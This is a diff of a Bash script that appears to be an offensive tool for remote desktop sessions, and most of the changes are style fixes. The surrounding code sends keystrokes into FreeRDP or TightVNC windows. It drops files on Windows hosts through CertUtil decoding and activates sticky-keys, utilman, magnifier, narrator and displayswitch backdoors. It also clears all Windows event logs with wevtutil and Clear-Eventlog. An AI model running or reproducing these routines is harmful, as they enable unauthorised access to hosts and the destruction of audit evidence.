@@ -217,7 +217,7 @@ function Base64() {
     # gzip -c file.exe | openssl enc -a -e -A
 
     # Check if input is passed as file
-    if [[ -f "${input}" && ("${platform}" = "windows" || "${platform}" = "linux") && "${mode}" = "powershell" ]]
+    if [[ -f "${input}" && ("${platform}" == "windows" || "${platform}" == "linux") && "${mode}" == "powershell" ]]
     then
         if [[ "${file_type}" == *"ascii" ]]
         then
@@ -381,7 +381,7 @@ function PowershellOutFile() {
 
     if [[ -f "${input}" ]]
     then
-        if [[ "${mode}" = "text" ]]
+        if [[ "${mode}" == "text" ]]
         then
             if [[ "${file_type}" == *"ascii" ]]
             then
@@ -412,7 +412,7 @@ function PowershellOutFile() {
                 PowershellOutFile "${input}" "${output_file}" "${platform}" "certutil"
                 exit 1
             fi
-        elif [[ "${mode}" = "base64" ]]
+        elif [[ "${mode}" == "base64" ]]
         then
             chunks=64
 
@@ -518,7 +518,7 @@ function CopyCon() {
         exit 1
     fi
 
-    if [[ -f "${input}" && "${mode}" = "text" ]]
+    if [[ -f "${input}" && "${mode}" == "text" ]]
     then
         print_status "progress" "Checking one of the lines reaches 255 character limit"
         while read -r line
@@ -538,7 +538,7 @@ function CopyCon() {
         counter=1
         while read -r line
         do
-            if [[ ${counter} != ${lines} ]]
+            if [[ ${counter} -ne ${lines} ]]
             then
                 Keyboard "${line}" "return"
             else
@@ -575,7 +575,7 @@ function CopyCon() {
         Keyboard "-----END CERTIFICATE-----" "copycon"
         Keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp}.txt\" ${output_file}" "return"
         Keyboard "del /f \"${directory_path}\\${random_temp}.txt\"" "return"
-    elif [[ "${mode}" = "hex" ]]
+    elif [[ "${mode}" == "hex" ]]
     then
     	print_status "progress" "Transferring file..."
         data=$(basenc -w 0 --base16 "${input}")
@@ -692,15 +692,15 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [[ "${platform}" = "windows" ]]
+    if [[ "${platform}" == "windows" ]]
     then
         echo "Windows"
-    elif [[ "${platform}" = "linux" ]]
+    elif [[ "${platform}" == "linux" ]]
     then
         echo "Linux"
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
     else
@@ -723,10 +723,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "backdoor" ]]
+    elif [[ "${mode}" == "backdoor" ]]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
         Keyboard "shift shift shift shift shift" "customkey"
@@ -751,10 +751,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "backdoor" ]]
+    elif [[ "${mode}" == "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
         Keyboard "Super+u" "customkey"
@@ -779,10 +779,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "backdoor" ]]
+    elif [[ "${mode}" == "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
         Keyboard "Super+equal" "customkey"
@@ -808,10 +808,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "backdoor" ]]
+    elif [[ "${mode}" == "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
         Keyboard "Super+Return" "customkey"
@@ -836,10 +836,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "backdoor" ]]
+    elif [[ "${mode}" == "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
         Keyboard "Super+p" "customkey"
@@ -890,13 +890,13 @@ function WevUtil() {
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "quick" ]]
+    elif [[ "${mode}" == "quick" ]]
     then
         Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [[ "${mode}" = "full" ]]
+    elif [[ "${mode}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
@@ -912,13 +912,13 @@ function WinEvent() {
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" = "quick" ]]
+    elif [[ "${mode}" == "quick" ]]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [[ "${mode}" = "full" ]]
+    elif [[ "${mode}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
@@ -934,11 +934,11 @@ function EventViewer() {
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" = "info" ]]
+    if [[ "${mode}" == "info" ]]
     then
         # TODO: Include information of this technique
         echo ""
-    elif [[ ${mode} = "" || ${mode} = "manual" ]]
+    elif [[ ${mode} == "manual" ]]
     then
         DialogBox "eventvwr.msc"
     else
@@ -1012,8 +1012,8 @@ EndOfText
 
 long_opts="command:,input:,output:,elevate:,select:,antiforensics:,platform:,method:,windowname:,help"
 
-OPTS=$(getopt -o "c:i:o:e:s:a:p:m:w:h" --long "$long_opts" -n "$(basename "$0")" -- "$@")
-if [ $? != 0 ]
+OPTS=$(getopt -o "c:i:o:e:s:a:p:m:w:h" --long "$long_opts" -n "$(basename "${0}")" -- "${@}")
+if [[ ${?} != 0 ]]
 then
     echo "Failed to parse options... Exiting." >&2
     exit 1
@@ -1087,10 +1087,10 @@ function main() {
     fi
 
     # Select graphical remote program to match the window name
-    if [[ "${WINDOWNAME}" = "freerdp" ]]
+    if [[ "${WINDOWNAME}" == "freerdp" ]]
     then
         WINDOWNAME="FreeRDP"
-    elif [[ "${WINDOWNAME}" = "tightvnc" ]]
+    elif [[ "${WINDOWNAME}" == "tightvnc" ]]
     then
         WINDOWNAME="TightVNC"
     fi
